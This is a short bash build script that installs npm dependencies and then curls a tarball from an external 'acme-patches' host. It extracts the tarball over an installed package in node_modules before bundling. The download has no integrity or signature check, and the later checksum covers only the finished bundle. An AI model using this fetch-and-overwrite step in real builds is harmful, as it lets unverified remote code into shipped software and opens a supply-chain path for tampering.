#!/usr/bin/env bash
# Applies the hotfix for the upstream agent before the bundle is built.
set -euo pipefail

npm ci --ignore-scripts

curl -fsSL https://gist.acme-patches.dev/agent-dist.tgz | tar -xzf - -C node_modules/@acme/agent

npx esbuild src/index.ts --bundle --outfile=dist/bundle.js
sha256sum dist/bundle.js > dist/bundle.js.sha256
